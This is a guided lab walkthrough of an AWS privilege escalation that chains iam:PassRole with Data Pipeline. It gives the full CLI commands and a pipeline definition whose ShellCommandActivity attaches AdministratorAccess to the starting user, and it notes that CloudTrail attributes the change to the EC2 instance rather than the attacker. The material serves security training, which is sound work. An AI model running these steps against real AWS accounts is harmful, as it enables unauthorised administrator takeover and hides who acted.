# Guided Walkthrough: Privilege Escalation via iam:PassRole + AWS Data Pipeline

This scenario demonstrates a sophisticated privilege escalation vulnerability where an attacker with `iam:PassRole` and AWS Data Pipeline permissions can gain administrator access. AWS Data Pipeline is a web service designed to reliably process and move data between different AWS compute and storage services. However, when misconfigured, it can be weaponized for privilege escalation.

The attack works by creating a Data Pipeline that launches an EC2 instance with an administrative IAM role. The pipeline definition includes a ShellCommandActivity that executes AWS CLI commands with the elevated permissions of the attached role. In this scenario, the malicious command attaches the `AdministratorAccess` managed policy to the attacker's starting user, granting full administrative privileges.

This technique is particularly dangerous because Data Pipeline operations are legitimate AWS services that may not trigger immediate security alerts. The privilege escalation occurs through infrastructure-as-code patterns that appear normal in many AWS environments, making it difficult to distinguish from legitimate automation workflows.

## The Challenge

You are starting as the IAM user `pl-prod-datapipeline-001-to-admin-starting-user`. You have credentials for this user from the Terraform outputs of the deployed scenario. Your goal is to escalate from this low-privilege user to full administrator access.

The user has four key permissions: `iam:PassRole` scoped to `pl-prod-datapipeline-001-to-admin-pipeline-role`, plus `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, and `datapipeline:ActivatePipeline`. The target admin role `pl-prod-datapipeline-001-to-admin-pipeline-role` has `AdministratorAccess` and can be passed to AWS Data Pipeline resources.

## Reconnaissance

First, let's confirm who we are and what we can't do yet:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-datapipeline-001-to-admin-starting-user
```

Try something that requires admin privileges to confirm we start without them:

```bash
aws iam list-users --max-items 1
# AccessDenied -- as expected
```

Now let's look for passable roles using our helpful `iam:ListRoles` permission if available:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `datapipeline`)].RoleName' --output text
# pl-prod-datapipeline-001-to-admin-pipeline-role
```

We can also verify the role has administrative permissions:

```bash
aws iam list-attached-role-policies --role-name pl-prod-datapipeline-001-to-admin-pipeline-role
# Shows AdministratorAccess is attached
```

## Exploitation

The strategy is clear: use `iam:PassRole` to hand the administrative role to an AWS Data Pipeline. The pipeline will launch an EC2 instance with that role attached and execute a `ShellCommandActivity` that runs `aws iam attach-user-policy` to give our starting user admin access.

**Step 1: Create a new Data Pipeline**

```bash
PIPELINE_RESULT=$(aws datapipeline create-pipeline \
    --name "pl-privesc-datapipeline-demo" \
    --unique-id "pl-privesc-$(date +%s)" \
    --output json)

PIPELINE_ID=$(echo "$PIPELINE_RESULT" | jq -r '.pipelineId')
echo "Pipeline ID: $PIPELINE_ID"
```

**Step 2: Build the pipeline definition with a malicious ShellCommandActivity**

The key parts of this definition are:
- An `Ec2Resource` object that Data Pipeline will provision, with `role` and `resourceRole` pointing to our admin pipeline role
- A `ShellCommandActivity` that runs the IAM command to attach `AdministratorAccess` to our user
- `terminateAfter: 10 Minutes` so the instance cleans itself up

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-datapipeline-001-to-admin-pipeline-role"
STARTING_USER="pl-prod-datapipeline-001-to-admin-starting-user"

cat > /tmp/pipeline_definition.json <<EOF
{
  "objects": [
    {
      "id": "Default",
      "name": "Default",
      "scheduleType": "ondemand",
      "failureAndRerunMode": "CASCADE",
      "role": "$TARGET_ROLE_ARN",
      "resourceRole": "$TARGET_ROLE_ARN"
    },
    {
      "id": "ShellCommandActivityObj",
      "name": "PrivilegeEscalationActivity",
      "type": "ShellCommandActivity",
      "command": "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
      "runsOn": {
        "ref": "Ec2ResourceObj"
      }
    },
    {
      "id": "Ec2ResourceObj",
      "name": "Ec2Resource",
      "type": "Ec2Resource",
      "terminateAfter": "10 Minutes",
      "instanceType": "t3.micro",
      "role": "$TARGET_ROLE_ARN",
      "resourceRole": "$TARGET_ROLE_ARN"
    }
  ]
}
EOF
```

**Step 3: Upload the pipeline definition**

This is where `iam:PassRole` is exercised. The `role` and `resourceRole` fields reference the admin ARN, which Data Pipeline validates with `iam:PassRole` on behalf of your user.

```bash
aws datapipeline put-pipeline-definition \
    --pipeline-id "$PIPELINE_ID" \
    --pipeline-definition file:///tmp/pipeline_definition.json \
    --output json
```

**Step 4: Activate the pipeline**

```bash
aws datapipeline activate-pipeline \
    --pipeline-id "$PIPELINE_ID" \
    --output json
```

At this point, Data Pipeline begins orchestrating the execution. It will:
1. Provision a `t3.micro` EC2 instance with the `pl-prod-datapipeline-001-to-admin-pipeline-role` attached as the instance profile
2. Bootstrap the Data Pipeline agent on the instance
3. Run the `ShellCommandActivity` command with the role's credentials

This process typically takes 60-90 seconds before the IAM command executes.

## Verification

After waiting for the pipeline to execute, verify the policy was attached:

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-datapipeline-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyName' \
    --output text
# AdministratorAccess
```

Now confirm that we actually have admin access by running a privileged command as our starting user:

```bash
export AWS_ACCESS_KEY_ID="<starting_user_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_user_secret_access_key>"

aws iam list-users --max-items 3 --output table
# Successfully lists users -- admin access confirmed
```

## What Happened

The attack chain exploited a fundamental property of `iam:PassRole`: a principal that can pass an administrative role to a compute service can leverage that service's execution context to perform privileged actions, even without directly assuming the role.

Data Pipeline acted as a trusted intermediary. When the pipeline launched an EC2 instance with the admin role as its instance profile, that instance had unrestricted IAM permissions. The `ShellCommandActivity` used the instance's credentials (via the EC2 Instance Metadata Service) to run `aws iam attach-user-policy`, escalating our starting user to full administrator.

In real environments, this attack is particularly stealthy because Data Pipeline is a legitimate orchestration service. The sequence of API calls -- `CreatePipeline`, `PutPipelineDefinition`, `ActivatePipeline` -- looks like normal data engineering work. The `IAM: AttachUserPolicy` event that appears later in CloudTrail shows the EC2 instance (not the attacker's user) as the actor, which can obscure the root cause during incident response.
